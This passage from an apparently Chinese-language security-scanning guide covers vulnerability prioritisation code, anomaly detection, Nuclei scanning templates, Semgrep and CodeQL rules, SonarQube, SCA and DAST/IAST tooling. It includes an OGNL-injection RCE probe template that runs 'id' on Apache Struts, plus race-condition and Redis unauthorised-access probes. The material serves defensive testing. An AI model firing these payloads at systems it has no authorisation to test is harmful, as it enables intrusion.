from typing import List, Dict, Optional

@dataclass
class Vulnerability:
    cve_id: str
    cvss_score: float
    cvss_vector: str
    description: str
    published_date: str
    exploit_maturity: str  # unproven, poc, functional, high
    affected_product: str
    affected_version: str
    fix_version: Optional[str]
    epss_score: float     # Exploit Prediction Scoring System
    cisa_kev: bool         # CISA Known Exploited Vulnerabilities
    asset_criticality: str  # critical, high, medium, low
    network_exposure: str   # internet, internal, isolated

class CVEScanner:
    def __init__(self, nvd_api_key: str = None):
        self.nvd_api_key = nvd_api_key
        self.nvd_base = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.cache = {}
    
    def fetch_cve(self, cve_id: str) -> Dict:
        """从NVD获取CVE详情"""
        if cve_id in self.cache:
            return self.cache[cve_id]
        
        headers = {}
        if self.nvd_api_key:
            headers['apiKey'] = self.nvd_api_key
        
        resp = requests.get(
            f"{self.nvd_base}?cveId={cve_id}",
            headers=headers,
            timeout=30
        )
        
        if resp.status_code == 200:
            data = resp.json()
            self.cache[cve_id] = data
            return data
        return None
    
    def calculate_vpr(self, vuln: Vulnerability) -> float:
        """计算漏洞优先级评分 (VPR) — 2026年增强版算法"""
        score = 0.0
        
        # 1. CVSS基础分 (权重: 40%)
        cvss_normalized = min(vuln.cvss_score / 10.0, 1.0)
        score += cvss_normalized * 0.40
        
        # 2. EPSS利用概率 (权重: 25%)
        score += (vuln.epss_score / 100.0) * 0.25
        
        # 3. 利用成熟度 (权重: 20%)
        maturity_scores = {
            'unproven': 0.0, 'poc': 0.4, 'functional': 0.7, 'high': 1.0
        }
        score += maturity_scores.get(vuln.exploit_maturity, 0.0) * 0.20
        
        # 4. CISA KEV列表 (权重: 10%)
        if vuln.cisa_kev:
            score += 0.10
        
        # 5. 资产重要性调整 (权重: 5%)
        asset_scores = {
            'critical': 1.0, 'high': 0.7, 'medium': 0.4, 'low': 0.1
        }
        score += asset_scores.get(vuln.asset_criticality, 0.0) * 0.05
        
        # 6. 网络暴露度 (额外的乘数)
        exposure_multipliers = {
            'internet': 1.5, 'internal': 1.0, 'isolated': 0.5
        }
        score *= exposure_multipliers.get(vuln.network_exposure, 1.0)
        
        # 7. 时间衰减 (最近发布的漏洞得分更高)
        try:
            pub_date = datetime.strptime(vuln.published_date, '%Y-%m-%d')
            days_old = (datetime.now() - pub_date).days
            if days_old > 365:
                score *= 0.8  # 超过一年降低20%
            elif days_old < 30:
                score *= 1.2  # 最近30天增加20%（零日窗口）
        except:
            pass
        
        return min(round(score, 2), 10.0)
    
    def match_asset_cves(self, asset_info: Dict) -> List[Vulnerability]:
        """根据资产信息匹配CVE"""
        # 这里使用OSV/CPE匹配
        # 实际实现中查询NVD、OSV、GitHub Advisory Database
        pass

# 使用示例
scanner = CVEScanner()
vuln = Vulnerability(
    cve_id="CVE-2026-12345",
    cvss_score=9.8,
    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    description="Remote Code Execution in Apache Struts 2.5.33",
    published_date="2026-07-15",
    exploit_maturity="functional",
    affected_product="Apache Struts",
    affected_version="2.5.33",
    fix_version="2.5.34",
    epss_score=0.85,
    cisa_kev=True,
    asset_criticality="critical",
    network_exposure="internet"
)
vpr = scanner.calculate_vpr(vuln)
print(f"VPR Score for {vuln.cve_id}: {vpr}/10.0")
```

### 3.5 0day检测与虚假阳性过滤

0day检测是2026年漏洞扫描的前沿领域。传统基于签名的扫描无法检测0day，但AI驱动的行为分析、异常检测和模糊测试可以识别未知漏洞。

```python
#!/usr/bin/env python3
"""AI驱动的异常检测 — 0day发现辅助"""

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import json

class ZeroDayDetector:
    """基于响应异常的0day检测器"""
    
    def __init__(self, contamination=0.1):
        self.model = IsolationForest(
            contamination=contamination,
            random_state=42,
            n_estimators=200
        )
        self.scaler = StandardScaler()
        self.feature_names = [
            'response_length', 'response_time_ms', 'status_code',
            'header_count', 'content_type_entropy', 'error_ratio',
            'redirect_count', 'body_entropy', 'js_size', 'api_call_count'
        ]
    
    def extract_features(self, responses: List[Dict]) -> np.ndarray:
        """从HTTP响应中提取特征"""
        features = []
        for resp in responses:
            feat = [
                len(resp.get('body', '')),
                resp.get('response_time_ms', 0),
                resp.get('status_code', 200),
                len(resp.get('headers', {})),
                self._entropy(str(resp.get('content_type', ''))),
                resp.get('body', '').count('error') / max(len(resp.get('body', '')), 1),
                resp.get('redirect_count', 0),
                self._entropy(resp.get('body', '')),
                len(resp.get('js_files', [])),
                resp.get('api_call_count', 0)
            ]
            features.append(feat)
        return np.array(features)
    
    def _entropy(self, text: str) -> float:
        """计算字符串熵值"""
        if not text:
            return 0.0
        prob = [float(text.count(c)) / len(text) for c in set(text)]
        return -sum(p * np.log2(p) for p in prob)
    
    def detect_anomalies(self, responses: List[Dict]) -> List[Dict]:
        """检测异常响应（可能是0day的迹象）"""
        features = self.extract_features(responses)
        features_scaled = self.scaler.fit_transform(features)
        predictions = self.model.fit_predict(features_scaled)
        
        anomalies = []
        for i, pred in enumerate(predictions):
            if pred == -1:  # 异常
                anomalies.append({
                    'index': i,
                    'url': responses[i].get('url'),
                    'score': self.model.score_samples([features_scaled[i]])[0],
                    'response': responses[i]
                })
        return anomalies

# 虚假阳性过滤器
class FalsePositiveFilter:
    """基于规则的虚假阳性过滤"""
    
    RULES = [
        # 规则1: 非生产环境标记
        {
            'name': 'non_production_env',
            'condition': lambda v: any(kw in str(v.get('url', '')).lower() 
                                        for kw in ['staging', 'dev', 'test', 'uat']),
            'action': 'reduce_severity',
            'reason': '非生产环境，降低严重性'
        },
        # 规则2: 已知的误报模式
        {
            'name': 'known_false_positive',
            'condition': lambda v: v.get('plugin_id') in ['11219', '51192', '42873'],
            'action': 'suppress',
            'reason': '已知误报插件'
        },
        # 规则3: 需要认证的漏洞但未认证
        {
            'name': 'unauthenticated_scan',
            'condition': lambda v: v.get('requires_auth') and not v.get('authenticated'),
            'action': 'flag_for_review',
            'reason': '需要认证扫描确认'
        },
        # 规则4: 版本误报（服务版本与实际不符）
        {
            'name': 'version_mismatch',
            'condition': lambda v: v.get('detected_version') != v.get('actual_version'),
            'action': 'suppress',
            'reason': '版本检测不准确'
        },
        # 规则5: 补偿控制已存在
        {
            'name': 'compensating_control',
            'condition': lambda v: v.get('mitigated_by_waf') or v.get('mitigated_by_firewall'),
            'action': 'reduce_severity',
            'reason': '已有补偿控制措施'
        }
    ]
    
    def filter(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """应用过滤规则"""
        filtered = []
        for vuln in vulnerabilities:
            action = 'keep'
            reason = None
            for rule in self.RULES:
                if rule['condition'](vuln):
                    action = rule['action']
                    reason = rule['reason']
                    break
            if action != 'suppress':
                if action == 'reduce_severity':
                    vuln['severity'] = self._reduce_severity(vuln['severity'])
                if action == 'flag_for_review':
                    vuln['flagged'] = True
                vuln['filter_note'] = reason
                filtered.append(vuln)
        return filtered
```

---

## §4 模板驱动扫描 (Template-Based Scanning)

### 4.1 概述

模板驱动扫描以Nuclei为代表，是2026年最灵活、最高效的漏洞扫描范式。通过YAML模板定义漏洞检测逻辑，实现了扫描逻辑与扫描引擎的分离。Nuclei 3.x在2026年引入了多协议支持（TCP/UDP/TLS/SSH/MySQL/Redis）、工作流模板（Workflow）、条件竞争检测（Race Condition）、以及JavaScript预处理（JS Preprocessor）。

Nuclei社区模板库在2026年已超过10,000个模板，覆盖从Web应用到IoT设备、云服务、API、区块链节点等各类目标。企业可以基于社区模板构建自定义模板库，实现符合自身业务需求的精准扫描。

### 4.2 Nuclei 3.x 核心命令

```bash
# 安装Nuclei 3.x
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 更新模板库（2026年社区模板库）
nuclei -update-templates
nuclei -update-template-dir /opt/nuclei-templates

# 基础扫描
nuclei -u https://example.com -t nuclei-templates/ -severity critical,high,medium

# 批量目标扫描
nuclei -l targets.txt -t nuclei-templates/ \
  -severity critical,high,medium \
  -exclude-severity low,info \
  -timeout 10 \
  -concurrency 100 \
  -rate-limit 150 \
  -bulk-size 50 \
  -jsonl -o nuclei_results.jsonl

# 带认证的扫描
nuclei -u https://example.com \
  -t nuclei-templates/ \
  -H "Authorization: Bearer eyJhbG..." \
  -H "X-CSRF-Token: abc123"

# 使用代理（配合Burp Suite）
nuclei -u https://example.com \
  -t nuclei-templates/ \
  -proxy http://127.0.0.1:8080

# 工作流模板（多步骤扫描）
nuclei -u https://example.com \
  -t workflows/tech-detect.yaml \
  -t workflows/tech-based-scan.yaml \
  -jsonl -o workflow_results.jsonl

# 条件竞争检测（2026新特性）
nuclei -u https://example.com \
  -t race-condition/ \
  -race-conditions \
  -race-count 10 \
  -jsonl -o race_results.jsonl

# 多协议扫描（TCP/UDP/TLS/SSH等）
nuclei -u tcp://10.0.0.100:3306 \
  -t network/ \
  -jsonl -o network_results.jsonl

# 使用JavaScript预处理器
nuclei -u https://example.com \
  -t javascript-templates/ \
  -js-pool-size 10 \
  -jsonl -o js_results.jsonl
```

### 4.3 自定义模板开发

Nuclei模板使用YAML格式，分为四个主要部分：信息（info）、请求（requests）、匹配器（matchers）、提取器（extractors）。2026年的模板语法支持更复杂的逻辑。

**模板1：2026年CVE检测模板**

```yaml
id: CVE-2026-28541

info:
  name: Apache Struts 2.5.33 - Remote Code Execution (CVE-2026-28541)
  author: security-team
  severity: critical
  description: |
    2026年7月公布的Apache Struts 2.5.33远程代码执行漏洞，
    通过OGNL注入实现未授权RCE。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-28541
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-28541
  metadata:
    verified: true
    max-request: 2
    shodan-query: 'http.component:"Apache Struts"'
    fofa-query: 'app="Apache-Struts2"'
    cvss: 9.8
    cvss-vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cisa-kev: true
    epss-score: 0.92
  tags: cve,cve2026,apache,struts,rce,kev

variables:
  ognl_payload: "${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#iswin=...)...}"
  random_marker: "{{rand_base(16)}}"

flow: |
  http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/struts2-showcase/"
    
    headers:
      User-Agent: "{{ognl_payload}}"
      X-Random: "{{random_marker}}"
    
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'uid=')"
          - "contains(body, 'gid=')"
          - "status_code == 200"
        condition: and
    
    extractors:
      - type: regex
        name: command_output
        regex:
          - "uid=(\\d+)\\(([^)]+)\\)"
        group: 2

  - method: POST
    path:
      - "{{BaseURL}}/struts2-showcase/action.action"
    
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    
    body: "name=%25%7B{{ognl_payload}}%7D&submit=Submit"
    
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and
```

**模板2：工作流模板（多步骤检测）**

```yaml
id: tech-stack-detection-workflow

info:
  name: 技术栈检测与针对性扫描工作流
  author: security-team
  severity: info
  description: 先检测技术栈，再根据技术栈加载对应的漏洞模板

workflows:
  - template: technologies/tech-detect.yaml
    subtemplates:
      - tags: ${detected_tech}
      - template: cves/2026/${detected_product}-${detected_version}.yaml
```

**模板3：条件竞争检测模板**

```yaml
id: race-condition-coupon-reuse

info:
  name: 优惠券并发使用条件竞争
  author: security-team
  severity: high
  description: 检测优惠券/积分等资源是否可以被并发消耗多次
  tags: race-condition,business-logic

race: true
threads: 10

requests:
  - raw:
      - |
        POST /api/coupons/redeem HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}
        
        {"coupon_code": "{{coupon_code}}", "order_id": "{{rand_base(8)}}"}
    
    matchers:
      - type: dsl
        dsl:
          - "duplicate_count('success') > 1"
        condition: and
```

**模板4：多协议TCP模板**

```yaml
id: redis-unauthorized-access

info:
  name: Redis未授权访问检测
  author: security-team
  severity: high
  tags: network,redis,unauthorized

network:
  - host:
      - "{{Hostname}}"
    
    inputs:
      - data: "PING\r\n"
        read: 1024
      
      - data: "INFO\r\n"
        read: 4096
    
    matchers:
      - type: word
        words:
          - "+PONG"
          - "redis_version"
        condition: and
```

### 4.4 模板管理与自动化

```bash
# 自定义模板目录结构
# /opt/nuclei-templates/
#   cves/
#     2024/ 2025/ 2026/
#   exposures/
#     configs/
#     misconfigurations/
#   vulnerabilities/
#     generic/
#     cms/
#   workflows/
#   network/
#   javascript/
#   race-condition/

# 模板验证
nuclei -validate -t custom-templates/

# 仅运行特定标签的模板
nuclei -u https://example.com -t nuclei-templates/ \
  -tags cve,2026,rce -severity critical

# 排除特定标签
nuclei -u https://example.com -t nuclei-templates/ \
  -exclude-tags dos,bruteforce,intrusive

# 模板统计
nuclei -t nuclei-templates/ -stats -jsonl -o /dev/null

# 使用自定义模板参数
nuclei -u https://example.com \
  -t custom-templates/ \
  -var "token=eyJhbG..." \
  -var "base_path=/api/v2" \
  -env "ENVIRONMENT=production"

# 模板自动更新定时任务
cat > /etc/cron.daily/nuclei-update << 'EOF'
#!/bin/bash
nuclei -update-templates
nuclei -ut -ud /opt/nuclei-templates
echo "[$(date)] Nuclei templates updated" >> /var/log/nuclei-update.log
EOF
chmod +x /etc/cron.daily/nuclei-update
```

### 4.5 Nuclei与CI/CD集成

```yaml
# .github/workflows/nuclei-scan.yml
name: Nuclei Security Scan

on:
  schedule:
    - cron: '0 2 * * *'  # 每天凌晨2点
  workflow_dispatch:

jobs:
  nuclei-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Install Nuclei
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
      
      - name: Update Templates
        run: nuclei -update-templates
      
      - name: Run Nuclei Scan
        run: |
          nuclei -l production_urls.txt \
            -t ~/nuclei-templates/ \
            -severity critical,high,medium \
            -rate-limit 100 \
            -concurrency 50 \
            -jsonl -o nuclei_results.jsonl \
            -stats -stats-interval 60
      
      - name: Analyze Results
        run: |
          CRITICAL=$(cat nuclei_results.jsonl | jq -r 'select(.info.severity=="critical")' | wc -l)
          HIGH=$(cat nuclei_results.jsonl | jq -r 'select(.info.severity=="high")' | wc -l)
          echo "Critical: $CRITICAL, High: $HIGH"
          if [ "$CRITICAL" -gt 0 ]; then
            echo "CRITICAL VULNERABILITIES FOUND! Blocking pipeline."
            exit 1
          fi
      
      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: nuclei-results
          path: nuclei_results.jsonl
```

---

## §5 静态应用安全测试 (SAST & Code Analysis)

### 5.1 概述

SAST（静态应用安全测试）在2026年经历了AI驱动的范式转变。传统基于规则和模式匹配的SAST工具（如SonarQube、Fortify、Checkmarx）正在被AI增强的代码审计工具（如Semgrep with AI、CodeQL with Copilot、以及新兴的LLM代码审查器）所补充甚至部分替代。

SAST的核心价值在于"Shift Left"——在开发阶段尽早发现安全漏洞，降低修复成本。2026年的SAST最佳实践强调：IDE集成（Pre-commit/Pre-push门禁）、CI/CD流水线自动化、AI辅助修复建议、以及开发者友好的误报过滤。

核心技术栈：Semgrep 1.70+、CodeQL 2.18+、SonarQube 10.8+、Bearer、GitHub Copilot Code Review、以及LLM辅助审计。

### 5.2 Semgrep 实战

Semgrep在2026年已成为最灵活、最易用的SAST工具，支持30+种编程语言，拥有超过2,000条社区规则，并支持AI驱动的自动修复（Semgrep AI Fix）。

```bash
# 安装Semgrep
pip install semgrep

# 基础扫描（使用默认规则集）
semgrep --config auto /path/to/code

# 使用特定规则集
semgrep --config "p/owasp-top-ten" \
  --config "p/cwe-top-25" \
  --config "p/secrets" \
  --config "p/supply-chain" \
  --config "p/r2c-security-audit" \
  /path/to/code

# 扫描特定语言
semgrep --config "p/java" --config "p/spring" /path/to/java/project

# JSON输出（用于CI/CD集成）
semgrep --config auto --json --output semgrep_results.json /path/to/code

# SARIF输出（用于GitHub Code Scanning集成）
semgrep --config auto --sarif --output semgrep_results.sarif /path/to/code

# 仅扫描变更文件（Git diff）
semgrep --config auto --baseline-commit HEAD~1 /path/to/code

# AI自动修复（2026年新特性）
semgrep --config auto --autofix --apply /path/to/code

# 使用Pro规则（需要Semgrep Pro许可证）
semgrep --config "p/default" --pro --pro-intrafile /path/to/code
```

**自定义Semgrep规则开发**:

```yaml
# custom_rules/sql_injection.yaml
rules:
  - id: java-sql-injection-string-concatenation
    patterns:
      - pattern-either:
          - pattern: |
              $STMT.executeQuery("..." + $VAR + "...")
          - pattern: |
              $STMT.executeUpdate("..." + $VAR + "...")
          - pattern: |
              String $SQL = "..." + $VAR + "...";
              ...
              $STMT.executeQuery($SQL);
      - pattern-not: |
          $STMT.executeQuery("...")
      - pattern-not-inside: |
          $VAR = $SANITIZER.escape(...);
          ...
    message: |
      检测到SQL注入风险：使用字符串拼接构建SQL查询。
      应使用PreparedStatement参数化查询。
      CWE-89: SQL Injection
    severity: ERROR
    languages:
      - java
    metadata:
      cwe: "CWE-89"
      owasp: "A03:2021 - Injection"
      category: security
      technology:
        - java
        - jdbc
      confidence: HIGH
      likelihood: HIGH
      impact: HIGH
      references:
        - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
    fix: |
      使用PreparedStatement代替字符串拼接：
      PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
      stmt.setString(1, $VAR);

  - id: python-command-injection-os-system
    patterns:
      - pattern-either:
          - pattern: os.system("..." % $VAR)
          - pattern: os.system(f"...{$VAR}...")
          - pattern: subprocess.call("..." + $VAR + "...", shell=True)
          - pattern: subprocess.Popen("..." + $VAR + "...", shell=True)
    message: |
      检测到命令注入风险：使用shell=True且拼接用户输入。
      应使用subprocess.run()并传递参数列表。
      CWE-78: OS Command Injection
    severity: ERROR
    languages:
      - python
    metadata:
      cwe: "CWE-78"
      owasp: "A03:2021 - Injection"
      references:
        - https://docs.python.org/3/library/subprocess.html#security-considerations
    fix: |
      subprocess.run(["command", arg1, arg2], shell=False)
```

### 5.3 CodeQL 实战

CodeQL是GitHub提供的语义代码分析引擎，2026年版本2.18+支持更深的跨文件数据流分析、AI辅助查询生成、以及GitHub Actions原生集成。

```bash
# 创建CodeQL数据库
codeql database create codeql_db \
  --language=javascript \
  --source-root=/path/to/project \
  --command="npm run build"

# 运行CodeQL分析
codeql database analyze codeql_db \
  --format=sarif-latest \
  --output=codeql_results.sarif \
  --threads=4 \
  javascript-code-scanning.qls

# 运行自定义查询
codeql query run custom_queries/xss_detection.ql \
  --database=codeql_db \
  --output=xss_results.bqrs

# 解码结果
codeql bqrs decode --format=csv xss_results.bqrs -o xss_results.csv

# 使用CodeQL CLI上传到GitHub
codeql github upload-results \
  --sarif=codeql_results.sarif \
  --repository=org/repo \
  --commit=HEAD
```

**CodeQL查询示例 — 检测SSRF漏洞**:

```ql
/**
 * @name 服务端请求伪造 (SSRF) 检测
 * @description 检测从用户输入构建URL并发起HTTP请求的代码模式
 * @kind path-problem
 * @problem.severity error
 * @security-severity 8.5
 * @precision high
 * @id java/ssrf
 * @tags security
 *       external/cwe/cwe-918
 */

import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.security.RequestForgeryConfig
import DataFlow::PathGraph

class SSRFConfig extends TaintTracking::Configuration {
  SSRFConfig() { this = "SSRFConfig" }

  override predicate isSource(DataFlow::Node source) {
    source instanceof RemoteFlowSource
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess ma |
      ma.getMethod().hasName(["openConnection", "execute", "send", "get", "post"]) and
      (
        ma.getMethod().getDeclaringType().getASupertype*().hasQualifiedName("java.net", "URL") or
        ma.getMethod().getDeclaringType().getASupertype*().hasQualifiedName("org.apache.http", "HttpClient") or
        ma.getMethod().getDeclaringType().getASupertype*().hasQualifiedName("okhttp3", "OkHttpClient") or
        ma.getMethod().getDeclaringType().getASupertype*().hasQualifiedName("org.springframework.web.client", "RestTemplate")
      ) and
      sink.asExpr() = ma.getAnArgument()
    )
  }

  override predicate isSanitizer(DataFlow::Node node) {
    // URL白名单校验
    exists(MethodAccess ma |
      ma.getMethod().hasName(["isAllowedHost", "isValidUrl", "isInternalIp"]) and
      node.asExpr() = ma
    )
  }
}

from SSRFConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "SSRF漏洞：用户输入 $@ 被用于构建HTTP请求URL", source.getNode(), "用户输入"
```

### 5.4 SonarQube 10.8 企业级SAST

SonarQube在2026年仍然是企业级SAST的首选平台，10.8版本引入了AI代码审查（Sonar AI CodeFix）、Docker/OCI镜像安全扫描、以及SBOM自动生成。

```bash
# Docker Compose部署SonarQube 10.8
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  sonarqube:
    image: sonarqube:10.8-community
    ports:
      - "9000:9000"
    environment:
      - SONAR_JDBC_URL=jdbc:postgresql://db:5432/sonar
      - SONAR_JDBC_USERNAME=sonar
      - SONAR_JDBC_PASSWORD=sonar2026
      - SONAR_ES_BOOTSTRAP_CHECKS_DISABLE=true
    volumes:
      - sonarqube_data:/opt/sonarqube/data
      - sonarqube_extensions:/opt/sonarqube/extensions
      - sonarqube_logs:/opt/sonarqube/logs
    depends_on:
      - db
    restart: unless-stopped

  db:
    image: postgres:16
    environment:
      - POSTGRES_USER=sonar
      - POSTGRES_PASSWORD=sonar2026
      - POSTGRES_DB=sonar
    volumes:
      - postgresql_data:/var/lib/postgresql/data

volumes:
  sonarqube_data:
  sonarqube_extensions:
  sonarqube_logs:
  postgresql_data:
EOF

# SonarScanner CLI扫描
sonar-scanner \
  -Dsonar.projectKey=my-project \
  -Dsonar.sources=src/ \
  -Dsonar.host.url=http://sonarqube:9000 \
  -Dsonar.token=sqp_abc123 \
  -Dsonar.java.binaries=target/classes \
  -Dsonar.qualitygate.wait=true \
  -Dsonar.qualitygate.timeout=300

# SonarQube Quality Gate配置 (sonar-project.properties)
cat > sonar-project.properties << 'EOF'
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.projectVersion=1.0.0
sonar.sources=src/main/java,src/main/js
sonar.tests=src/test/java,src/test/js
sonar.java.binaries=target/classes
sonar.java.libraries=target/dependency/*.jar
sonar.javascript.lcov.reportPaths=coverage/lcov.info
sonar.java.coveragePlugin=jacoco
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
sonar.exclusions=**/generated/**/*.java,**/node_modules/**
sonar.qualitygate.wait=true
sonar.qualitygate.timeout=300
EOF
```

### 5.5 AI代码审计 (LLM辅助审计)

2026年，LLM（大语言模型）在代码审计领域的应用已从实验阶段进入生产实战。以下为AI代码审计的实战模式：

```python
#!/usr/bin/env python3
"""AI辅助代码审计引擎"""

import json, os, hashlib
from typing import List, Dict, Optional
from pathlib import Path

class AIAgentAuditor:
    """基于LLM的AI代码审计代理"""
    
    SECURITY_PROMPTS = {
        "sql_injection": """
分析以下代码是否存在SQL注入漏洞。检查：
1. 是否使用字符串拼接构建SQL查询
2. 是否使用参数化查询
3. 输入是否经过适当的验证和转义
4. ORM框架是否正确使用

代码：
{code}

返回JSON格式：
{{"vulnerable": true/false, "severity": "high/medium/low", 
 "line_number": int, "description": "中文描述", 
 "cwe": "CWE-89", "fix_suggestion": "修复建议"}}
""",
        "xss": """
分析以下代码是否存在跨站脚本攻击(XSS)漏洞。检查：
1. 用户输入是否直接输出到HTML
2. 是否使用适当的上下文编码
3. 前端框架的自动转义是否被绕过
4. DOM操作是否安全

代码：
{code}

返回JSON格式：
{{"vulnerable": true/false, "severity": "high/medium/low",
 "type": "reflected/stored/DOM", "description": "中文描述",
 "cwe": "CWE-79", "fix_suggestion": "修复建议"}}
""",
        "auth_bypass": """
分析以下代码是否存在认证绕过漏洞。检查：
1. JWT Token验证是否完整
2. Session管理是否安全
3. 权限检查是否在所有端点执行
4. API网关认证是否可被绕过

代码：
{code}

返回JSON格式：
{{"vulnerable": true/false, "severity": "critical/high/medium",
 "description": "中文描述",
 "cwe": "CWE-287", "fix_suggestion": "修复建议"}}
"""
    }
    
    def __init__(self, model="claude-sonnet-4-20250514", api_key=None):
        self.model = model
        self.api_key = api_key
        self.cache = {}
    
    def analyze_file(self, file_path: str, check_types: List[str] = None) -> List[Dict]:
        """分析单个文件"""
        if check_types is None:
            check_types = list(self.SECURITY_PROMPTS.keys())
        
        with open(file_path, 'r') as f:
            source_code = f.read()
        
        # 计算文件哈希用于缓存
        file_hash = hashlib.md5(source_code.encode()).hexdigest()
        if file_hash in self.cache:
            return self.cache[file_hash]
        
        findings = []
        for check_type in check_types:
            prompt = self.SECURITY_PROMPTS[check_type].format(code=source_code[:8000])
            result = self._call_llm(prompt)
            if result and result.get('vulnerable'):
                result['file'] = file_path
                result['check_type'] = check_type
                findings.append(result)
        
        self.cache[file_hash] = findings
        return findings
    
    def _call_llm(self, prompt: str) -> Optional[Dict]:
        """调用LLM API（示例使用Anthropic Claude）"""
        # 实际实现调用Anthropic/OpenAI/本地LLM API
        # 这里仅展示接口
        pass
    
    def audit_directory(self, directory: str, extensions: List[str] = None) -> List[Dict]:
        """审计整个目录"""
        if extensions is None:
            extensions = ['.py', '.java', '.js', '.ts', '.go', '.rb', '.php']
        
        all_findings = []
        for root, dirs, files in os.walk(directory):
            # 跳过node_modules, .git等
            dirs[:] = [d for d in dirs if d not in ['node_modules', '.git', 'venv', '__pycache__']]
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    findings = self.analyze_file(file_path)
                    all_findings.extend(findings)
        
        return all_findings
```

### 5.6 依赖漏洞扫描 (Software Composition Analysis)

依赖漏洞扫描是SAST的重要组成部分，2026年的SCA工具需要覆盖：开源组件漏洞、许可证合规、供应链攻击检测、以及SBOM（软件物料清单）生成。

```bash
# 使用OWASP Dependency-Check
dependency-check.sh \
  --project "my-project" \
  --scan /path/to/project \
  --format JSON \
  --format HTML \
  --out /path/to/reports \
  --nvdApiKey $NVD_API_KEY

# 使用Snyk CLI
snyk auth $SNYK_TOKEN
snyk test --all-projects --json > snyk_results.json
snyk monitor --all-projects

# 使用npm audit
npm audit --json > npm_audit.json

# 使用pip-audit
pip-audit --require-hashes --format json -o pip_audit.json

# 使用Trivy进行依赖扫描
trivy fs --scanners vuln,secret, misconfig \
  --severity CRITICAL,HIGH \
  --format json \
  -o trivy_fs.json \
  /path/to/project

# 生成SBOM (CycloneDX格式)
cyclonedx-bom -o sbom.json --format json /path/to/project
syft /path/to/project -o cyclonedx-json > sbom.json

# 验证SBOM签名
cosign verify-blob \
  --key cosign.pub \
  --signature sbom.json.sig \
  sbom.json
```

---

## §6 动态与交互式扫描 (DAST & IAST)

### 6.1 概述

DAST（动态应用安全测试）和IAST（交互式应用安全测试）是SAST的互补技术。DAST从外部模拟攻击者视角测试运行中的应用，IAST通过在应用内部植入探针（Agent）获取运行时上下文信息，实现更高精度的漏洞检测。

2026年的DAST/IAST技术栈已实现深度融合：AI驱动的模糊测试（AI Fuzzing）、字节码插桩（Bytecode Instrumentation）的智能化、API自动发现与参数推断、以及运行时软件成分分析（Runtime SCA）。

核心技术栈：Burp Suite Enterprise 2026、Acunetix 360、Contrast Security IAST、HCL AppScan、以及新兴的AI-Fuzzer（如Google Atheris、Microsoft OneFuzz）。

### 6.2 Acunetix 360 自动化DAST

Acunetix 360在2026年提供了企业级的DAST能力，支持SPA扫描、API安全测试、以及OAUTH2/OIDC认证流程的自动化。

```bash
# Acunetix 360 REST API 自动化扫描
# 配置API端点
ACUNETIX_URL="https://acunetix.example.com:3443"
API_KEY="your-api-key"

# 创建扫描目标
curl -X POST "$ACUNETIX_URL/api/1.0/targets" \
  -H "X-Auth: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "address": "https://example.com",
    "description": "Production Web Application",
    "criticality": 30,
    "type": "default"
  }'

# 配置扫描设置
curl -X POST "$ACUNETIX_URL/api/1.0/scans" \
  -H "X-Auth: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "target_id": "target-uuid",
    "profile_id": "11111111-1111-1111-1111-111111111111",
    "report_template_id": "22222222-2222-2222-2222-222222222222",
    "schedule": {
      "disable": false,
      "start_date": null,
      "time_sensitive": false
    }
  }'

# 启动扫描
SCAN_ID="scan-uuid"
curl -X POST "$ACUNETIX_URL/api/1.0/scans/$SCAN_ID/start" \
  -H "X-Auth: $API_KEY"

# 获取扫描结果
curl "$ACUNETIX_URL/api/1.0/scans/$SCAN_ID/results" \
  -H "X-Auth: $API_KEY" | jq '.vulnerabilities[] | {severity, name, url}'
```

### 6.3 IAST 字节码插桩

IAST的核心优势在于精确的漏洞定位和极低的误报率。通过运行时字节码插桩，IAST可以追踪数据从污点源（Taint Source）到污点接收器（Taint Sink）的完整传播路径。

**Java IAST探针集成（Contrast Security风格）**:

```bash
# 启动Java应用时附加IAST Agent
java -javaagent:/opt/contrast/contrast-agent.jar \
  -Dcontrast.api.url=https://contrast.example.com \
  -Dcontrast.api.api_key=$CONTRAST_API_KEY \
  -Dcontrast.api.service_key=$CONTRAST_SERVICE_KEY \
  -Dcontrast.api.user_name=$CONTRAST_USERNAME \
  -Dcontrast.server.name=production-api \
  -Dcontrast.server.environment=PRODUCTION \
  -jar myapp.jar

# 自定义IAST规则（基于污点传播）
cat > contrast_rules.yaml << 'EOF'
rules:
  - name: "custom-ssrf-detection"
    type: "taint-propagation"
    sources:
      - method: "javax.servlet.http.HttpServletRequest.getParameter*"
      - method: "javax.ws.rs.core.UriInfo.getQueryParameters*"
      - method: "org.springframework.web.bind.annotation.RequestParam"
    propagators:
      - method: "java.lang.StringBuilder.append*"
      - method: "java.net.URI.<init>*"
    sinks:
